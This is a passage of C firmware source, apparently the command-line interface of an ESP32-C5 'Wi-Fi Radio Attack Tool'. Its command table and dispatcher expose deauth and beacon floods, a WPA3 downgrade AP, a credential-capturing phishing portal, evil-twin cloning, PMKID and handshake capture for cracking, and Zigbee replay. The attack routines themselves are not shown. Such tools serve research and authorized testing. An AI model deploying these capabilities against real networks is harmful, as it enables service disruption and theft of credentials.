            bool same_ssid = strcmp(a->ssid, mate->ssid) == 0;
            bool one_hidden = a->hidden != mate->hidden;
            bool same_dev = (oui_same && adj) ||
                            (loc_a != loc_b && (same_ssid || one_hidden));
            char b1[18], b2[18];
            mac_to_str(a->bssid, b1);
            mac_to_str(mate->bssid, b2);
            printf("META,WIFI6,CONFLICT,ch,%u,color,%u,aps,%d,bssids,%s|%s,same_dev,%d\n",
                   (unsigned)a->channel, (unsigned)a->bss_color, k + 1,
                   b1, b2, same_dev ? 1 : 0);
            if (!same_dev) conflicts++;
        }
    }

    printf("META,WIFI6,DONE,aps,%d,he,%d,colors,%d,conflicts,%d,"
           "twt_req,%d,twt_ie,%d,sixg,%d\n",
           n, he, colors, conflicts, twt_req, twt_ie, sixg);
    fflush(stdout);
    return 0;
}

/* csi: Wi-Fi CSI 采样与动作检测 */
static int cmd_csi(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  csi start [ch]   start CSI sampling on a fixed channel (default 6)\n"
               "  csi stop         stop\n"
               "  csi stats        counters (frames / rate / subcarriers)\n"
               "  csi raw <n>      dump next n frames as hex\n"
               "  csi selftest     synthetic sequence check\n");
        fflush(stdout);
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "start") == 0) {
        uint8_t ch = (argc >= 3) ? (uint8_t)atoi(argv[2]) : 6;
        esp_err_t e = csi_start(ch);
        if (e != ESP_OK) {
            printf("META,CSI,ERR,msg,start_failed,code,%d\n", (int)e);
            fflush(stdout);
            return 1;
        }
        printf("META,CSI,START,ok,1,ch,%u\n", (unsigned)ch);
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "stop") == 0) {
        esp_err_t e = csi_stop();
        if (e != ESP_OK) {
            printf("META,CSI,ERR,msg,not_running\n"); fflush(stdout); return 1;
        }
        printf("META,CSI,STOP,ok,1\n"); fflush(stdout); return 0;
    }
    if (strcmp(sub, "stats") == 0) { csi_stats(); return 0; }
    if (strcmp(sub, "selftest") == 0) { csi_selftest(); return 0; }
    if (strcmp(sub, "raw") == 0) {
        int n = (argc >= 3) ? atoi(argv[2]) : 4;
        csi_raw(n);
        printf("META,CSI,RAWC,ok,1,n,%d\n", n);
        fflush(stdout);
        return 0;
    }
    printf("META,CSI,ERR,msg,bad_subcmd\n"); fflush(stdout);
    return 1;
}

/* events (事件快照) */
static int cmd_events(int argc, char **argv)
{
    int n = (argc >= 2) ? atoi(argv[1]) : 10;
    char *buf = malloc(3072);
    if (!buf) return 1;
    event_snapshot_json(buf, 3072, n);
    printf("%s\n", buf);
    fflush(stdout);
    free(buf);
    return 0;
}

/* 前置声明: 实现放到命令表之后, 以便遍历 g_cmds 自动生成 */
static int cmd_help(int argc, char **argv);


static const cli_cmd_t g_cmds[] = {
    { "help",        "Show command list",    NULL,                   cmd_help,        NULL },
    { "version",     "Show firmware version", NULL,                  cmd_version,     NULL },
    { "status",      "Show state/counters",  NULL,                   cmd_status,      NULL },
    { "sniff",       "Start promisc sniff",  "<ch|auto> [-n N] (1-14,36-177)", cmd_sniff,  sniff_arg_reset },
    { "stop",        "Stop sniff/inject",    NULL,                   cmd_stop,        NULL },
    { "airtime",     "Per-channel airtime census", "[--dwell ms] [--band 2g|5g|all] [--ch N]", cmd_airtime, NULL },
    { "wifi6",       "Wi-Fi 6 structure: BSS color / TWT / RNR", NULL, cmd_wifi6, NULL },
    { "csi",         "Wi-Fi CSI sensing (motion)", "start [ch]|stop|stats|raw <n>|selftest", cmd_csi, NULL },
    { "deauth",      "Deauth inject",        "-b <bssid> [opts]",    cmd_deauth,      deauth_arg_reset },
    { "beaconflood", "Beacon flood",         "-p <prefix> [opts]",   cmd_beaconflood, beacon_arg_reset },
    { "probeflood",  "Probe req flood",      "[opts]",               cmd_probeflood,  probe_arg_reset },
    { "flood",       "Flood AP (deauth/disassoc/auth)", "-b <bssid> -t <type> [opts]", cmd_flood, flood_arg_reset },
    { "radio",       "Radio arbiter (owner/case log/conflict table)", "[status]|log <n>|test <a> <b>", cmd_radio, NULL },
    { "http",        "HTTP REST API",        "<start|stop|status>",  cmd_http,        http_arg_reset },
    { "downgrade",   "WPA3->WPA2 downgrade AP + EAPOL capture", "<ssid> [opts]|list", cmd_downgrade, downgrade_arg_reset },
    { "phish",       "Captive portal (phishing AP)", "start|stop|status|stations|creds|html", cmd_phish, NULL },
    { "cap",         "Raw frame capture to flash", "start|stop|clear|info|keys|read|hdr", cmd_cap, NULL },
    { "hs",          "EAPOL handshake -> hashcat 22000", "[complete]|clear|22000|selftest", cmd_hs, NULL },
    { "raw",         "Raw 802.11 frame builder / sender", "tx|deauth|auth|assoc|beacon|proberesp|csa", cmd_raw, NULL },
    { "karma",       "Probe-request SSID harvester", "clear|follow <n>", cmd_karma, NULL },
    { "eviltwin",    "Clone target AP (SSID+BSSID+channel)", "clone <bssid> [push]|stop", cmd_eviltwin, NULL },
    { "blescan",     "BLE neighbor scan (board-side)", "start|stop|clear", cmd_blescan, NULL },
    { "gatt",        "BLE GATT enumeration (central)", "<mac> [--timeout ms]|stop|status", cmd_gatt, NULL },
    { "ble",         "BLE TX power control (+20dBm)", "power [<0-15>]", cmd_ble, NULL },
    { "bleadv",      "BLE beacon spoof (iBeacon/Eddystone)", "ibeacon <uuid> <maj> <min> [s]|eddystone <url> [s]|stop|status", cmd_bleadv, NULL },
    { "zbsniff",     "802.15.4 (Zigbee/Thread) sniff", "<ch 11-26>|stop|status|dump|clear", cmd_zbsniff, NULL },
    { "zbtx",        "802.15.4 (Zigbee/Thread) TX", "beacon|beaconreq|data|raw|replay|flood|stop|stats", cmd_zbtx, NULL },
    { "ftm",         "802.11mc FTM ranging (RTT->distance)", "range <bssid> [ch] [count]", cmd_ftm, NULL },
    { "config",      "NVS config persistence",  "set <k> <v>|get <k>|list|reset", cmd_config, NULL },
    { "log",         "Show/capture log ring buffer", "[clear]", cmd_log, NULL },
    { "health",      "System self-check (heap/tasks/modules)", NULL, cmd_health, NULL },
    { "ota",         "Dual-slot OTA (status/confirm/rollback/url)", "status|confirm|rollback|url <url>|reboot", cmd_ota, NULL },
    { "scenario",    "One-shot orchestration (survey/handshake/pmf)", "survey [secs]|handshake <bssid> [secs]|pmf <bssid>|stop|status", cmd_scenario, NULL },
    { "locate",      "RSSI locate + CSV export", "<bssid|mac> [secs]|stop|status|export", cmd_locate, NULL },
    { "pmkid",       "PMKID: passive watch / active assoc", "watch <bssid|ch>|active <bssid|ssid>|status|clear", cmd_pmkid, NULL },
    { "events",      "Unified event bus snapshot", "[n]", cmd_events, NULL },
    { "export",      "Export data",          "<csv|json>",           cmd_export,      export_arg_reset },
    { "dump",        "Dump tables",          "<aps|clients|eapols|all|clear>", cmd_dump,   dump_arg_reset },
};
#define NUM_CMDS  (sizeof(g_cmds) / sizeof(g_cmds[0]))

/* help 实现 (遍历命令表自动生成)
 * 原实现用 fputs 硬编码命令清单, 与 g_cmds 表脱节, phish/cap/hs/raw/karma/
 * eviltwin/blescan 全都没出现在 help 里, 用户以为这些功能不存在.
 * 改为遍历 g_cmds, 从此新增命令自动出现在 help, 永不滞后. */
static int cmd_help(int argc, char **argv)
{
    (void)argc; (void)argv;
    fputs("Commands:\n", stdout);
    for (size_t i = 0; i < NUM_CMDS; i++) {
        const cli_cmd_t *c = &g_cmds[i];
        printf("  %-12s %s\n", c->name, c->help ? c->help : "");
        if (c->hint) printf("               Usage: %s %s\n", c->name, c->hint);
    }
    fputs("\n  Type '<cmd> --help' for detailed options.\n", stdout);
    fflush(stdout);
    return 0;
}

static const cli_cmd_t *find_cmd(const char *name)
{
    for (size_t i = 0; i < NUM_CMDS; i++) {
        if (strcmp(g_cmds[i].name, name) == 0) return &g_cmds[i];
    }
    return NULL;
}


int cli_exec_line(char *line)
{
    static char *argv[MAX_ARGC];

    char *p = line;
    while (*p && isspace((unsigned char)*p)) p++;
    if (!*p || *p == '#') return 0;

    int argc = split_args(line, argv, MAX_ARGC);
    if (argc == 0) return 0;

    /* 全局开关剥离 (只认 "--json" / "--force", 不影响各命令自己的参数) */
    g_json = g_force = g_yes = false;
    {
        int w = 1;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "--json") == 0)  { g_json  = true; continue; }
            if (strcmp(argv[i], "--force") == 0) { g_force = true; g_yes = true; continue; }
            if (strcmp(argv[i], "--yes") == 0 ||
                strcmp(argv[i], "-y") == 0)      { g_yes   = true; continue; }
            argv[w++] = argv[i];
        }
        argc = w;
    }

    const cli_cmd_t *c = find_cmd(argv[0]);
    if (!c) {
        /* 同理, 裸文本调用方收不到。逗号会破坏 CSV 分隔, 先压成空格 */
        char nm[24];
        snprintf(nm, sizeof(nm), "%s", argv[0]);
        for (char *p = nm; *p; p++) if (*p == ',' || *p == '\r' || *p == '\n') *p = ' ';
        printf("META,CLI,ERR,cmd,%s,msg,unknown_command\n", nm);
        fflush(stdout);
        return 1;
    }

    /* --help / -h 处理 */
    bool want_help = false;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            want_help = true; break;
        }
    }
    if (want_help) {
        printf("Usage: %s", c->name);
        if (c->hint) printf(" %s", c->hint);
        printf("\n  %s\n", c->help ? c->help : "");
        if (c->arg_reset) {
            c->arg_reset();
            void **at = NULL;
            int n = 0;
            if      (c->func == cmd_sniff)       { at = (void **)&sniff_args;       n = 3; }
            else if (c->func == cmd_deauth)      { at = (void **)&deauth_args;      n = 6; }
            else if (c->func == cmd_beaconflood) { at = (void **)&beacon_args;      n = 4; }
            else if (c->func == cmd_probeflood)  { at = (void **)&probe_args;       n = 3; }
            else if (c->func == cmd_export)      { at = (void **)&export_args;      n = 2; }
            else if (c->func == cmd_dump)         { at = (void **)&dump_args;        n = 2; }
            else if (c->func == cmd_downgrade)    { at = (void **)&downgrade_args;   n = 3; }
            
            if (at && n > 0) arg_print_glossary(stdout, at, "  %-30s %s\n");
        }
        fflush(stdout);
        return 0;
    }

    if (c->arg_reset) c->arg_reset();

    /* 帧标记: BEGIN..END 之间的行归属本条命令, 按位置界定而非逐行打标签.
     * 逐行打标签要改所有 META 产出点, 漏一处就串味; 按位置只改这一处入口, 串口与 BLE
     * 两条路同时生效. 调用方维护 Map<stream,行[]>: 见 BEGIN 开桶, 见 END 封桶
     * 交给发起者; 帧外的行仍走主动事件通道, 与旧版行为一致.
     * rc 取命令返回值; 区分"被拒"与"致命失败"看帧内有无 META,...,ERR 行. */
    uint32_t sid = ++s_stream_id;
    printf("META,CLI,BEGIN,stream,%u,cmd,%s\n", (unsigned)sid, c->name);
    fflush(stdout);

    int ret = c->func(argc, argv);

    printf("META,CLI,END,stream,%u,cmd,%s,rc,%d\n", (unsigned)sid, c->name, ret);
    fflush(stdout);

    rgb_led_event(ret == 0 ? RGB_EV_CMD_SUCCESS : RGB_EV_CMD_ERROR, 0);
    return ret;
}


esp_err_t cli_start(void)
{
    fputs("\n"
          "========================================\n"
          " ESP32-C5 Wi-Fi Radio Attack Tool (rftool)\n"
          "========================================\n"
          " >> Authorized use ONLY (self-net / CTF / research) <<\n"
          " >> Unauthorized deauth/beacon flood is ILLEGAL <<\n"
          " Type 'help' for commands; 'sniff <ch>' to start\n"
          "========================================\n\n", stdout);
    fflush(stdout);

    rgb_led_set_status(RGB_IDLE);

    sniff_arg_reset();
    deauth_arg_reset();
    beacon_arg_reset();
    probe_arg_reset();
    export_arg_reset();
    dump_arg_reset();
    http_arg_reset();
    downgrade_arg_reset();

    static char line[MAX_CMDLINE];

    while (1) {
        fputs("rftool> ", stdout);
        fflush(stdout);

        if (fgets(line, sizeof(line), stdin) == NULL) {
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }

        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) {
            line[--len] = '\0';
        }

        cli_exec_line(line);
    }

    return ESP_OK;
}
